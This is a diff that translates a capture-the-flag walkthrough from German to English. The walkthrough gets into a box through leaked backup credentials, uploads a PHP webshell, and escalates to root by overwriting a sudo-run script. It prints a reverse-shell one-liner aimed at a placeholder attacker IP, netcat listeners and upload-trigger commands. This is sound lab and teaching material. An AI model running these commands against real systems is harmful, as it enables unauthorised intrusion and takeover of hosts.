@@ -34,32 +34,32 @@ Found: `/content/inc/mysql_backup/`
 
 ## 3. Initial Access
 
-Backup file enthielt Credentials:
+The backup file contained credentials:
 
 ```
 User:     manager
 Password: Password123
 ```
 
-Admin-Panel unter:
+Admin panel at:
 
 ```
 http://<TARGET_IP>/content/as/
 ```
 
-Login erfolgreich.
+Login successful.
 
 ---
 
 ## 4. Code Execution
 
-Upload-Funktion im Media Center verfügbar. PHP-Execution getestet:
+Upload functionality available in Media Center. Tested PHP execution:
 
 ```php
 <?php system("id"); ?>
 ```
 
-Output: `www-data` → RCE bestätigt.
+Output: `www-data` → RCE confirmed.
 
 ---
 
@@ -71,19 +71,19 @@ Output: `www-data` → RCE bestätigt.
 nc -lvnp 4444
 ```
 
-**Terminal 2 — Shell vorbereiten:**
+**Terminal 2 — Prepare shell:**
 
-PHP-Reverse-Shell als `.phtml` speichern (Attacker IP eintragen: `<ATTACKER_IP>`, Port: `4444`).
+Save a PHP reverse shell as `.phtml` (set your `<ATTACKER_IP>` and port `4444`).
 
 **Upload:** Media Center → Browse → `shell.phtml` → Done
 
-**Shell triggern:**
+**Trigger the shell:**
 
 ```bash
 curl http://<TARGET_IP>/content/attachment/shell.phtml
 ```
 
-→ Zugriff als `www-data`.
+→ Access as `www-data`.
 
 ---
 
@@ -93,7 +93,7 @@ curl http://<TARGET_IP>/content/attachment/shell.phtml
 find / -name user.txt 2>/dev/null
 ```
 
-Flag unter: `/home/itguy/user.txt`
+Flag at: `/home/itguy/user.txt`
 
 ---
 
@@ -111,13 +111,13 @@ Output:
 
 ---
 
-## 8. Exploit-Pfad analysieren
+## 8. Analyze the Exploit Path
 
 ```bash
 cat /home/itguy/backup.pl
 ```
 
-Inhalt:
+Content:
 
 ```perl
 system("sh", "/etc/copy.sh");
@@ -127,31 +127,31 @@ system("sh", "/etc/copy.sh");
 ls -l /etc/copy.sh
 ```
 
-`/etc/copy.sh` ist schreibbar durch `www-data`.
+`/etc/copy.sh` is writable by `www-data`.
 
 ---
 
 ## 9. Privilege Escalation
 
-Script überschreiben:
+Overwrite the script:
 
 ```bash
 echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > /etc/copy.sh
 ```
 
-Listener starten:
+Start listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Als root ausführen:
+Execute as root:
 
 ```bash
 sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 
-→ Root Shell erhalten.
+→ Root shell obtained.
 
 ---
 
@@ -165,7 +165,7 @@ cat /root/root.txt
 
 ## Lessons Learned
 
-- Backup-Dateien können Credentials leaken → immer auf `/backup/`, `/inc/`, `/db/` prüfen
-- Schwache Upload-Restrictions ermöglichen RCE über PHP-Webshells
-- Beschreibbare Scripts, die via `sudo` ausgeführt werden, sind direkte Eskalationspfade
-- `sudo -l` frühzeitig prüfen
+- Backup files can leak credentials → always check `/backup/`, `/inc/`, `/db/`
+- Weak upload restrictions allow RCE via PHP webshells
+- Writable scripts executed via `sudo` are direct escalation paths
+- Always check `sudo -l` early
